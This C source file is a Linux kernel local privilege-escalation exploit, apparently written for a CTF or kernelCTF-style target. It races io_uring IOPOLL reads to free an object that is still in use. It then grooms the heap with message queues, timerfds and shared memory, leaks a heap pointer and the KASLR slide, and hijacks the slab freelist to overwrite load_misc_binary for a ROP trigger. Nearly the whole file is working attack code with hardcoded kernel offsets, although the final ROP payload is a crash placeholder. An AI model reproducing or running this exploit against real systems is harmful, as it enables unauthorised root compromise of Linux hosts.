#define _GNU_SOURCE 

#include <dirent.h>
#include <endian.h>
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>
#include <assert.h>
#include <fcntl.h>
#include <linux/fs.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/timerfd.h>
#include <x86intrin.h>

#include <linux/capability.h>
#include <linux/futex.h>
#include <linux/io_uring.h>

// io_uring tutorial: https://unixism.net/2020/04/io-uring-by-example-article-series/
#define u64 unsigned long long
#define u32 unsigned int
#ifndef __NR_io_uring_enter
#define __NR_io_uring_enter 426
#endif
#ifndef __NR_io_uring_setup
#define __NR_io_uring_setup 425
#endif

int fd_io_uring;
u64 kaslr_slide = 0;
u64 kernel_base = 0;
int mid_tfd = -1, upper_msgqid = -1, lower_msgqid = -1;
#define GROOM_NUM 0x20
char trigger_path[] = "/tmp/x";
char *path_ptr = trigger_path;
u64 prsp = 0xffffffff8106de70;
u64 pivot_target = 0xffffffff8278cc00;
u64 cpu_num = 4;
u64 work_num = 0x200;
char fname[] = "/etc/resolv.conf";
u64 heap_addr;
int target_shmid;
char timerfd_backup[0x100];
#define NAP_TIME 50000
#define CRASH_ADDR 0xffffffffdeadbeef

void set_cpu(int cpuid)
{
	cpu_set_t my_set;
	CPU_ZERO(&my_set);
	CPU_SET(cpuid, &my_set);
	assert(sched_setaffinity(0, sizeof(my_set), &my_set) == 0);
}

struct cq_ring_t {
	u32 *head;
	u32 *tail;
	u32 *ring_mask;
	u32 *ring_entries;
	struct io_uring_cqe *cqes;
};

struct sq_ring_t {
	u32 *head;
	u32 *tail;
	u32 *ring_mask;
	u32 *ring_entries;
	u32 *flags;
	u32 *array;
};

struct uring_mgr_t {
	int fd;
	struct sq_ring_t sq_ring;
	struct cq_ring_t cq_ring;
	struct io_uring_sqe *sqes;
};

#define IORING_OP_WRITE 23
#define IORING_OP_READ 22

struct uring_mgr_t mgr;
void uring_mgr_setup(struct uring_mgr_t *mgr, u32 entries)
{
	// create io_uring fd
	struct io_uring_params setup_params = {0};
	setup_params.flags = IORING_SETUP_IOPOLL;
	mgr->fd = syscall(__NR_io_uring_setup, entries, &setup_params);
	assert(mgr->fd >= 0);

	// map the ring buffer and the SQE(submission queue entry) buffer
	uint32_t sq_ring_sz = setup_params.sq_off.array + setup_params.sq_entries * sizeof(uint32_t);
	uint32_t cq_ring_sz = setup_params.cq_off.cqes + setup_params.cq_entries * sizeof(struct io_uring_cqe);
	uint32_t ring_sz = sq_ring_sz > cq_ring_sz ? sq_ring_sz : cq_ring_sz;
	uint32_t sqes_sz = setup_params.sq_entries * sizeof(struct io_uring_sqe);
	void *ring_ptr = mmap(NULL, ring_sz, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, mgr->fd, IORING_OFF_SQ_RING);
	mgr->sqes = mmap(NULL, sqes_sz, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, mgr->fd, IORING_OFF_SQES);
	assert((long)mgr->sqes >= 0);

	// now initialize the completion queue
	struct cq_ring_t *cq_ring = &mgr->cq_ring;
	cq_ring->head = ring_ptr + setup_params.cq_off.head;
	cq_ring->tail = ring_ptr + setup_params.cq_off.tail;
	cq_ring->ring_mask = ring_ptr + setup_params.cq_off.ring_mask;
	cq_ring->ring_entries = ring_ptr + setup_params.cq_off.ring_entries;
	cq_ring->cqes = ring_ptr + setup_params.cq_off.cqes;

	// now initialize the submission queue
	struct sq_ring_t *sq_ring = &mgr->sq_ring;
	sq_ring->head = ring_ptr + setup_params.sq_off.head;
	sq_ring->tail = ring_ptr + setup_params.sq_off.tail;
	sq_ring->ring_mask = ring_ptr + setup_params.sq_off.ring_mask;
	sq_ring->ring_entries = ring_ptr + setup_params.sq_off.ring_entries;
	sq_ring->flags = ring_ptr + setup_params.sq_off.flags;
	sq_ring->array = ring_ptr + setup_params.sq_off.array;
}

void hex_print(void *addr, size_t len)
{
	u64 tmp_addr = (u64)addr;
	puts("");
	for(u64 tmp_addr=(u64)addr; tmp_addr < (u64)addr + len; tmp_addr += 0x10) {
		printf("0x%016llx: 0x%016llx 0x%016llx\n", tmp_addr, *(u64 *)tmp_addr, *(u64 *)(tmp_addr+8));
	}
}

#define barrier()  __asm__ __volatile__("":::"memory")

int *flag;
u64 val;
u64 *val_ptr = &val;
u64 elapse_time[2];
void *func(void *arg) {
	int cpuid = (int)(long)arg;
	set_cpu(cpuid);
	while(*flag == 0);
	// u64 start = current_time_micro();
	register u64 start = __rdtsc();
	int ret = syscall(__NR_io_uring_enter, fd_io_uring, work_num/2, work_num/2, 1);
	// u64 end = current_time_micro();
	register u64 end = __rdtsc();
	elapse_time[cpuid] = end-start;
	__atomic_fetch_add(&val, 1, __ATOMIC_SEQ_CST);
}

void trigger_free()
{
	// 199113 /etc/ssl/certs/ca-certificates.crt
	// 2601712 /node-boot/kdump/vmlinuz-5.10.19+
	// 28046896 /usr/lib/x86_64-linux-gnu/libicudata.so.66.1
	uring_mgr_setup(&mgr, work_num);
	fd_io_uring = mgr.fd;

	// open some file
	// fd = open("/etc/passwd", O_RDONLY|O_NONBLOCK|O_DIRECT|O_SYNC);
	int fds[work_num];
	for(int i=0; i<work_num; i++) {
		// fds[i] = open("/etc/resolv.conf", O_RDONLY|O_NONBLOCK|O_DIRECT|O_SYNC);
		fds[i] = open(fname, O_RDONLY|O_NONBLOCK|O_DIRECT|O_SYNC);
		assert(fds[i] >= 0);
	}
	printf("fd: %d\n", fds[0]);
	assert(fds[0] >= 0);

	// SQE: submission queue entries
	// struct io_uring_sqe sqe = {
	// 	.opcode = IORING_OP_WRITE,
	// 	.flags = 0,
	// 	.ioprio = 0,
	// 	.fd = fd,
	// 	.off = 0,
	// 	.addr = 0,
	// 	.len = 1,
	// };
	void *buf = mmap(NULL, 0x5000000, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0);
	memset(buf, 'A', 0x5000000);

	struct io_uring_sqe sqe = {
		.opcode = IORING_OP_READ,
		.flags = 0,
		.ioprio = 0,
		.fd = -1,
		.off = 0,
		.addr = buf,
		.len = 0x5000000,
	};

	// now submit the request
	struct sq_ring_t *sq_ring = &mgr.sq_ring;
	struct cq_ring_t *cq_ring = &mgr.cq_ring;
	u32 index, tail, next_tail;
	next_tail = tail = *sq_ring->tail;
	next_tail++;
	barrier();
	// copy the request to the sqe buffer
	index = tail & *mgr.sq_ring.ring_mask;
	for(int i=0; i<work_num; i++) {
		sqe.fd = fds[i];
		memcpy(&mgr.sqes[index+i], &sqe, sizeof(struct io_uring_sqe));
	}
	
	sq_ring->array[index] = index;
	tail = next_tail;
	assert(*sq_ring->tail != tail);
	*sq_ring->tail = work_num;

	// heap grooming
	char buffer[0x2000];
	for(int i=0; i<2; i++) {
		int msgqids[0x100];
		memset(buffer, 0x41+i, sizeof(buffer));// taint msgq
		// safe allocate
		set_cpu(2);
		for(int j=0; j<0x100; j++) msgqids[j] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT); 

		set_cpu(i);
		for(int j=0; j<0x100; j++) {
			assert(msgsnd(msgqids[j], buffer, 0x1000+0xf0-0x30, IPC_NOWAIT) >= 0);
			if(j % 8 == 0) msgrcv(msgqids[j], buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT);
		}
	}

	set_cpu(2);

	pthread_t tids[2];
	int ret;
	for(int i=0; i<2; i++) {
		ret = pthread_create(&tids[i], NULL, func, i);
		assert(ret == 0);
	}
	*flag = 1;
	sleep(1);
	while(*val_ptr != 2);
	pthread_join(tids[0], NULL);
	pthread_join(tids[1], NULL);
	printf("diff: %#llx\n", abs(elapse_time[1]-elapse_time[0]));

	// sleep(1000);
	execve("/", NULL, NULL);
	close(fd_io_uring);
	for(int i=0; i<2; i++) {
		memset(buffer, 0x41+i, sizeof(buffer));// taint msgq
		set_cpu(i);
		// defragment(0x1100-0x30-0x10, 0x100);
		int msgqids[0x100];
		// safe allocate
		set_cpu(2);
		for(int j=0; j<0x100; j++) msgqids[j] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT); 

		set_cpu(i);
		for(int j=0; j<0x100; j++) {
			assert(msgsnd(msgqids[j], buffer, 0x1000+0xf0-0x30, IPC_NOWAIT) >= 0);
			if(j % 8 == 0) msgrcv(msgqids[j], buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT);
		}
	}
	exit(0);
}

void cleanup_msgs(void)
{
	int msgqid;
	struct msqid_ds ds;
	struct msginfo msginfo;
	int maxind = msgctl(0, MSG_INFO, (struct msqid_ds *) &msginfo);
	assert(maxind >= 0);

	printf("cleanup %d msgs\n", maxind);

	for(int i=0; i<maxind; i++) {
		int ret;
		msgqid = msgctl(i, MSG_STAT, &ds);
		assert(msgqid >= 0);
		ret = msgctl(msgqid, IPC_RMID, 0);
		assert(ret >= 0);
	}
}

void cleanup_msgs_in_cpu(int cpuid)
{
	set_cpu(cpuid);

	int msgqid;
	struct msqid_ds ds;
	struct msginfo msginfo;
	int maxind = msgctl(0, MSG_INFO, (struct msqid_ds *) &msginfo);
	char buffer[0x2000];
	assert(maxind >= 0);

	printf("cleanup %d msgs\n", maxind);


	for(int i=0; i<maxind; i++) {
		int ret;
		msgqid = msgctl(i, MSG_STAT, &ds);
		assert(msgqid >= 0);
		ret = msgrcv(msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
		// only clear messages in at CPU
		if(buffer[0] == 0x41+cpuid) {
			ret = msgctl(msgqid, IPC_RMID, 0);
			assert(ret >= 0);
		}
	}
}

int obj_cpuid = -1;
int check_trigger()
{
	int msgqid;
	struct msqid_ds ds;
	struct msginfo msginfo;
	int maxind = msgctl(0, MSG_INFO, (struct msqid_ds *) &msginfo);
	assert(maxind >= 0);

	char buffer[0x2000];
	char payload1[0x2000];
	char payload2[0x2000];
	memset(payload1, 'A', sizeof(payload1));
	memset(payload2, 'B', sizeof(payload2));

	// printf("check %d msgs\n", maxind);

	for(int i=0; i<maxind; i++) {
		int ret;
		msgqid = msgctl(i, MSG_STAT, &ds);
		assert(msgqid >= 0);
		for(int j=0; j<ds.msg_qnum; j++) {
			ret = msgrcv(msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
			assert(ret >= 0);
			if(memcmp(buffer, payload1, 0x10a0) && memcmp(buffer, payload2, 0x10a0)) {
				// hex_print(buffer, 0x10a0);
				u64 magic = *(u64 *)&buffer[0xfe0];
				// printf("cpu taint: %llx\n", magic);
				obj_cpuid = buffer[0] - 0x41;
				return msgqid;
			}
			msgrcv(msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT);
		}
	}
	exit(0);
}

#define SPRAY_MAX 0x40
int msgqids2[4][SPRAY_MAX];
int _search_for_victim(int cpuid)
{
	char buffer[0x2000];
	int tfd;
	int ret;

	memset(buffer, 'C', 0x10);
	memset(&buffer[0x10], '\x80', 0x1000);

	set_cpu(cpuid);
	for(int i=0; i<SPRAY_MAX; i++) {
		// int msgqid = msgqids2[cpuid][i];
		// memset(buffer, 'C', sizeof(buffer));
		// assert(msgsnd(msgqid, buffer, 0x1100-0x30-0x10, IPC_NOWAIT) >= 0);

		// overwrite the mid object
		tfd = timerfd_create(CLOCK_REALTIME, 0);
		// close(tfd);

		ret = msgrcv(lower_msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
		assert(ret >= 0);
		u64 magic = *(u64 *)&buffer[0x1040];
		// hex_print(&buffer[0xfe0], 0xa0);
		// printf("magic: %#llx\n", magic);
		//
		if(magic == 0xdead4ead00000000) {
			obj_cpuid = cpuid;
			// mid_tfd = timerfd_create(CLOCK_REALTIME, 0);
			mid_tfd = tfd;
			int msgqid = msgqids2[cpuid][i];
			// iron out the weird freelist
			for(int i=0; i<0x10; i++) assert(msgsnd(msgqid, buffer, 0xc1-0x30, IPC_NOWAIT) >= 0);
			heap_addr = *(u64 *)&buffer[0x1000] - 0x130;
			printf("mid_tfd: %d, upper_msgqid: %d\n", mid_tfd, upper_msgqid);
			assert(mid_tfd >= 0);
			return 1;
		}
	}

	return 0;
}

void increase_limit()
{
	int ret;
	struct rlimit open_file_limit;
	
	/* Query current soft/hard value */
	ret = getrlimit(RLIMIT_NOFILE, &open_file_limit);
	assert(ret >= 0);
	
	/* Set soft limit to hard limit */
	open_file_limit.rlim_cur = open_file_limit.rlim_max;
	ret = setrlimit(RLIMIT_NOFILE, &open_file_limit);
	assert(ret >= 0);
}

void search_for_victim()
{
	int found = 0;
	// printf("obj_cpuid: %d\n", obj_cpuid);
	// now try to find the victim object in all CPUs
	for(int i=0; i<2; i++) {
		found = _search_for_victim(i % cpu_num);
		if(found == 1) break;
	}
	if(!found) {
		puts("Fail to find the victim object in all CPUs, press enter to crash!");
		// getchar();
		exit(-1);
	}
}

void leak_heap_addr()
{
	// we found everything! now leak heap address!
    char buffer[0x2000];
    memset(buffer, 0, sizeof(buffer));
    msgrcv(lower_msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
	// hex_print(&buffer[0xfe0], 0x100);
    heap_addr = *(u64 *)&buffer[0x1000] - 0x130;
	if((heap_addr & 0xff) != 0) {
		puts("Fail to leak heap address, press Enter to crash!");
		// getchar();
		exit(-1);
	}
}

void func2() {
	set_cpu(2);
	char buffer[0x2000];
	printf("cpu: %d\n", sched_getcpu());
	msgrcv(lower_msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
}

void search_slab() {
	int shmfds[0x400];
	memset(shmfds, 0, sizeof(shmfds));
	int slab_found = 0;
	char buffer[0x2000];
	// set_cpu(obj_cpuid);
    for(int j=0; j<0x400; j++) {
		u64 tmp_hash;
		shmfds[j] = shmget(IPC_PRIVATE, 1, 0600);
		// shmfds[i][j] = timerfd_create(CLOCK_REALTIME, 0); //////////////////////////////////////////////////
		// shmfds[i][j] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT); //////////////////////////////////////////////////
		// printf("fd: %d\n", shmfds[j]);
		// set_cpu(3);
    	msgrcv(lower_msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
		// set_cpu((obj_cpuid+i)%cpu_num);
		tmp_hash = *(u64 *)&buffer[0xfe0];
		// memset(buffer, 'C', sizeof(buffer));
		// printf("hash: %#lx\n", tmp_hash);
		// printf("magic: %#lx\n", *(u64 *)&buffer[0xfe0]);
		if((tmp_hash >> 48) == 0xffff) {
			// puts("Found the Slab!");
			slab_found = 1;
			target_shmid = shmfds[j];
			// hex_print(&buffer[0xfe0], 0xa0);
			// obj_cpuid = i;
			break;
		}
	}
	if(!slab_found) {
		puts("Failed to find the target slab, press Enter to crash");
		// getchar();
		exit(-1);
	}
}

void hijack_freelist(int fd, u64 addr)
{

}

void attempt()
{
	puts("\n\n============= New Race Attempt =============");
	cleanup_msgs();
	sleep(1);

	// allocate message queues for later spray
	for(int cpuid=0; cpuid<4; cpuid++) {
		for(int i=0; i<SPRAY_MAX; i++) msgqids2[cpuid][i] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
	}

	flag = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANON, -1, 0);
	if(!fork()) {
		trigger_free();
	} else {
		set_cpu(2); ////////// maybe try to occupy the CPU here?
		wait(NULL);
		int found = 0;
		lower_msgqid = check_trigger();
		assert(obj_cpuid != -1);
		puts("[+] Found the lower msg!");
		printf("[+] Victim @ CPU %d\n", obj_cpuid);

		// // cleanup messages in the other CPU to save some fds
		// cleanup_msgs_in_cpu(1-obj_cpuid);
		// sleep(1);

		search_for_victim();
		// puts("[+] Found the victim object!");
		puts("[+] Found mid tfd!");
    	printf("[+] heap_addr: %#llx\n", heap_addr);

		// now defragment the slab so that once we free it, we know the hash means NULL
		puts("Do defrag");
		// set_cpu(obj_cpuid);
        for(int i=0; i<0x40; i++) timerfd_create(CLOCK_REALTIME, 0);
		int padding_msgqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
		int payload_msgqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
		puts("Defragment Done!");

		char buffer[0x2000];

		// leak NULL hash
		// printf("mid_tfd: %d\n", mid_tfd);
		// getchar();
		close(mid_tfd);
		usleep(NAP_TIME);
		// getchar();
		// set_cpu(3);
        msgrcv(lower_msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
		// set_cpu(obj_cpuid);
		// hex_print(&buffer[0xfe0], 0xa0);
        u64 null_hash = *(u64 *)&buffer[0xfe0];
		u64 null_hash2 = null_hash ^ 0x8000000000000000; // null hash is address-dependent
		u64 null_hash3 = null_hash ^ 0xb000000000000000; // null hash is address-dependent
		printf("NULL hash: %#lx\n", null_hash);
		printf("NULL hash 2: %#lx\n", null_hash2);
		printf("NULL hash 3: %#lx\n", null_hash3);
		// memset(buffer, 'C', sizeof(buffer));
		// getchar();

		// search for the slab because it can be reused by other CPUs
		search_slab();

		// now free the shmfd
		shmctl(target_shmid, IPC_RMID, NULL);

		// hijack freelist once the free happens
		while(1) {
        	msgrcv(lower_msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
			if(*(u64 *)&buffer[0xfe0] != 0) break;
		}
        msgrcv(lower_msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT);
		*(u64 *)&buffer[0xfd0+0x10] = null_hash ^ (heap_addr+0x110);
		*(u64 *)&buffer[0xfd0+0x90] = null_hash2 ^ (heap_addr+0x120);
        msgsnd(lower_msgqid, buffer, 0x1000+0x100-0x30-0x20, IPC_NOWAIT);

		// allocate a shmid to occupy the slot
		int mid_shmid = shmget(IPC_PRIVATE, 1, 0600);

		// allocate another message to completely overlap with lower msgqid
		// memset(buffer, 'C', 0x2000);
		*(u64 *)&buffer[0xfd0+0xa0-0x10] = null_hash3;
        msgsnd(padding_msgqid, buffer, 0x1000+0x100-0x30-0x20, IPC_NOWAIT);

		// allocate a timerfd so it overlaps with the lower msg
		// set_cpu(obj_cpuid);
        int lower_tfd = timerfd_create(CLOCK_REALTIME, 0);
		struct itimerspec timespec = {{10000, 0}, {10000, 0}};
        timerfd_settime(lower_tfd, 0, &timespec, 0);
        msgrcv(lower_msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
		// hex_print(&buffer[0xfe0], 0x100);
		u64 kptr = *(u64 *)&buffer[0x1018];
		kernel_base = kptr - (0xffffffff8137b7a0 - 0xffffffff81000000); // *REMOTE*
        kaslr_slide = kernel_base - 0xffffffff81000000;
        printf("kptr: %#llx\n", kptr);
        printf("kernel_base: %#llx\n", kernel_base);
        printf("kaslr_slide: %#llx\n", kaslr_slide);
        // assert((kernel_base & 0xfff) == 0);
        // assert((kaslr_slide & 0xfff) == 0);
        pivot_target += kaslr_slide;
        prsp += kaslr_slide;

		memcpy(timerfd_backup, &buffer[0xff0], 0x100);
		// hex_print(timerfd_backup, 0x100);
		// puts("Backup");
		// getchar();

		// now the heap is stable do some prep
		int msgqids[0x100];
		for(int i=0; i<0x100; i++) {
			msgqids[i] = msgget(IPC_PRIVATE, 0644 | IPC_CREAT); 
		}

		// prepare rop chain
        char rop_buf[0x2000];
        memset(rop_buf, 'A', sizeof(rop_buf));

		// getchar();
		// sleep for a while just in case of those cgroup BS
		sleep(1);

		// now free the padding message and do defragmentation until we see it got occupied in lower_msgqid
        msgrcv(padding_msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT);
		int found2 = 0;
		for(int i=0; i<0x100; i++) {
			int msgqid = msgqids[i];
			for(int j=0; j<0x8; j++) {
				*(u64 *)&buffer[0xfd8] = 0x4343434343434343;
				msgsnd(msgqid, buffer, 0x1000+0xd0-0x30, IPC_NOWAIT);
        		msgrcv(lower_msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
				if(*(u64 *)&buffer[0xfe8] == 0x4343434343434343) {
					found2 = 1;
					// printf("pading: %d, padding: %d\n", padding_msgqid, msgqid);
					padding_msgqid = msgqid;
					break;
				}
			}
			if(found2) break;
		}
		if(!found2) {
			puts("Fail to find the overlapped message, press any key to abort");
			// getchar();
			exit(-1);
		}

		// now we hit the overlapped message, hijack freelist and overwrite load_misc_binary
        int ret = msgrcv(padding_msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT);
        ret = msgrcv(lower_msgqid, buffer, sizeof(buffer), 0, MSG_NOERROR | IPC_NOWAIT);
		*(u64 *)&buffer[0xfe0+0x80] = null_hash2 ^ (0xffffffff82f907c8 + kaslr_slide);
		ret = msgsnd(lower_msgqid, buffer, 0x1000+0xd0-0x30, IPC_NOWAIT);
		memmove(&buffer[0xfc0], &buffer[0xfe0], 0x100);
		// memset(&buffer[0xfd0], 'A', 0x40);
		msgsnd(padding_msgqid, buffer, 0x1000+0xd0-0x30, IPC_NOWAIT);
		memset(rop_buf, 'A', sizeof(rop_buf));
		*(u64 *)&rop_buf[0x1000-0x28] = CRASH_ADDR;
		ret = msgsnd(payload_msgqid, rop_buf, 0x1000+0x100-0x30-0x20, IPC_NOWAIT); // overwrite load_misc_binary

		// trigger load_misc_binary to ROP
		execve(path_ptr, NULL, NULL);

		puts("Done");
		sleep(1000);
	}
}

void main(int argc, char *argv)
{
	increase_limit();

	// env_setup();
	system("echo 'AAAA' > /tmp/x; chmod u+x /tmp/x");
	while(1) {
		if(!fork()) attempt();
		else {
			wait(NULL);
		}
	}
}

